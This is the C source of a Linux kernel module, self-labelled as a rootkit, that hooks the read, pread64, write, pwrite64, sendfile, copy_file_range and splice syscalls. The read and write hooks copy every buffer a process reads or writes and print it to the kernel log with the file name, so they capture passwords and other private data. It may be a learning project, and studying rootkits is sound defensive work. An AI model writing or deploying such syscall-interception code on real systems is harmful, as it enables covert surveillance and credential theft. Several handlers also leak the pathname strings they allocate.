#include "constants.h"
#include "files.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/err.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/printk.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

static long do_read_hook(sysfun_t orig_func, struct pt_regs *p_regs, unsigned int ui32_fd,
                         char __user *s_buf, size_t sz_count, loff_t i64_pos)
{
    long i64_err           = 0;    // Error code of the copy functions
    long i64_ret           = 0;    // Return value of the real syscall
    char *s_data           = NULL; // Data read from the user
    const char *s_pathname = NULL; // Pathname of the file

    i64_ret = orig_func(p_regs);
    pr_cont(" = %ld\n", i64_ret);

    s_pathname = fd_get_pathname(ui32_fd);
    IF_U (IS_ERR_OR_NULL(s_pathname)) {
        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
    kfree_const(s_pathname);

    IF_U (i64_ret <= 0) {
        // No data read or error, return immediately
        IF_L (i64_ret == 0) {
            pr_info("[ROOTKIT] * No data read\n");
        }
        else {
            pr_err("[ROOTKIT] * Error: %ld\n", i64_ret);
        }
        return i64_ret;
    }

    s_data = (char *)kvmalloc(i64_ret + 1, GFP_KERNEL);

    IF_U (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
    }
    else {
        i64_err = strncpy_from_user(s_data, s_buf, i64_ret);

        IF_U (i64_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user\n");
        }
        else {
            s_data[i64_ret] = '\0';
            pr_info("[ROOTKIT] * Data read: %s\n", s_data);
        }

        kvfree(s_data);
    }

    return i64_ret;
}

static long do_write_hook(sysfun_t orig_func, struct pt_regs *p_regs, unsigned int ui32_fd,
                          const char __user *s_buf, size_t sz_count, loff_t i64_pos)
{
    long i64_err           = 0;    // Error code of the copy functions
    long i64_ret           = 0;    // Return value of the real syscall
    char *s_data           = NULL; // Data written to the user
    const char *s_pathname = NULL; // Pathname of the file

    i64_ret = orig_func(p_regs);
    pr_cont(" = %ld\n", i64_ret);

    s_pathname = fd_get_pathname(ui32_fd);
    IF_U (IS_ERR_OR_NULL(s_pathname)) {
        s_pathname = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
    kfree_const(s_pathname);

    IF_U (i64_ret <= 0) {
        // No data written or error, return immediately
        IF_L (i64_ret == 0) {
            pr_info("[ROOTKIT] * No data written\n");
        }
        else {
            pr_err("[ROOTKIT] * Error: %ld\n", i64_ret);
        }
        return i64_ret;
    }

    s_data = (char *)kvmalloc(i64_ret + 1, GFP_KERNEL);

    IF_U (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory\n");
    }
    else {
        i64_err = strncpy_from_user(s_data, s_buf, i64_ret);

        IF_U (i64_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user\n");
        }
        else {
            s_data[i64_ret] = '\0';
            pr_info("[ROOTKIT] * Data to write: %s\n", s_data);
        }

        kvfree(s_data);
    }

    return i64_ret;
}

// sys_read syscall hook handler
SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __user *, s_buf, size_t,
                      sz_count)
{
    pr_info("[ROOTKIT] read(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

    return do_read_hook(orig_read, p_regs, ui32_fd, s_buf, sz_count, OFFSET_MIN);
}

// sys_pread64 syscall hook handler
SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char __user *, s_buf,
                      size_t, sz_count, loff_t, i64_pos)
{
    pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);

    return do_read_hook(orig_pread64, p_regs, ui32_fd, s_buf, sz_count, i64_pos);
}

// sys_write syscall hook handler
SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const char __user *, s_buf,
                      size_t, sz_count)
{
    pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

    return do_write_hook(orig_write, p_regs, ui32_fd, s_buf, sz_count, OFFSET_MIN);
}

// sys_pwrite64 syscall hook handler
SYSCALL_HOOK_HANDLER4(pwrite64, orig_pwrite64, p_regs, unsigned int, ui32_fd, const char __user *,
                      s_buf, size_t, sz_count, loff_t, i64_pos)
{
    pr_info("[ROOTKIT] pwrite64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);

    return do_write_hook(orig_pwrite64, p_regs, ui32_fd, s_buf, sz_count, i64_pos);
}

// sys_sendfile syscall hook handler
SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32_in_fd,
                      loff_t __user *, p_offset, size_t, sz_count)
{
    long i64_ret               = 0;    // Return value of the real syscall
    const char *s_pathname_in  = NULL; // Pathname of the input file
    const char *s_pathname_out = NULL; // Pathname of the output file

    pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);

    i64_ret = orig_sendfile(p_regs);
    pr_cont(" = %ld\n", i64_ret);

    s_pathname_in  = fd_get_pathname(i32_in_fd);
    s_pathname_out = fd_get_pathname(i32_out_fd);
    IF_U (IS_ERR_OR_NULL(s_pathname_in)) {
        s_pathname_in = kstrdup_const("(error)", GFP_KERNEL);
    }
    IF_U (IS_ERR_OR_NULL(s_pathname_out)) {
        s_pathname_out = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] *  In file name: %s\n", s_pathname_in);
    pr_info("[ROOTKIT] * Out file name: %s\n", s_pathname_out);

    return i64_ret;
}

// sys_copy_file_range syscall hook handler
SYSCALL_HOOK_HANDLER6(copy_file_range, orig_copy_file_range, p_regs, int, i32_in_fd,
                      loff_t __user *, p_in_offset, int, i32_out_fd, loff_t __user *, p_out_offset,
                      size_t, sz_len, unsigned int, ui32_flags)
{
    long i64_ret               = 0;    // Return value of the real syscall
    const char *s_pathname_in  = NULL; // Pathname of the input file
    const char *s_pathname_out = NULL; // Pathname of the output file

    pr_info("[ROOTKIT] copy_file_range(%d, %p, %d, %p, %zu, %#x)", i32_in_fd, p_in_offset,
            i32_out_fd, p_out_offset, sz_len, ui32_flags);

    i64_ret = orig_copy_file_range(p_regs);
    pr_cont(" = %ld\n", i64_ret);

    s_pathname_in  = fd_get_pathname(i32_in_fd);
    s_pathname_out = fd_get_pathname(i32_out_fd);
    IF_U (IS_ERR_OR_NULL(s_pathname_in)) {
        s_pathname_in = kstrdup_const("(error)", GFP_KERNEL);
    }
    IF_U (IS_ERR_OR_NULL(s_pathname_out)) {
        s_pathname_out = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] *  In file name: %s\n", s_pathname_in);
    pr_info("[ROOTKIT] * Out file name: %s\n", s_pathname_out);

    return i64_ret;
}

// sys_splice syscall hook handler
SYSCALL_HOOK_HANDLER6(splice, orig_splice, p_regs, int, i32_in_fd, loff_t __user *, p_in_offset,
                      int, i32_out_fd, loff_t __user *, p_out_offset, size_t, sz_len, unsigned int,
                      ui32_flags)
{
    long i64_ret               = 0;    // Return value of the real syscall
    const char *s_pathname_in  = NULL; // Pathname of the input file
    const char *s_pathname_out = NULL; // Pathname of the output file

    pr_info("[ROOTKIT] splice(%d, %p, %d, %p, %zu, %#x)", i32_in_fd, p_in_offset, i32_out_fd,
            p_out_offset, sz_len, ui32_flags);

    i64_ret = orig_splice(p_regs);
    pr_cont(" = %ld\n", i64_ret);

    s_pathname_in  = fd_get_pathname(i32_in_fd);
    s_pathname_out = fd_get_pathname(i32_out_fd);
    IF_U (IS_ERR_OR_NULL(s_pathname_in)) {
        s_pathname_in = kstrdup_const("(error)", GFP_KERNEL);
    }
    IF_U (IS_ERR_OR_NULL(s_pathname_out)) {
        s_pathname_out = kstrdup_const("(error)", GFP_KERNEL);
    }
    pr_info("[ROOTKIT] *  In file name: %s\n", s_pathname_in);
    pr_info("[ROOTKIT] * Out file name: %s\n", s_pathname_out);

    return i64_ret;
}
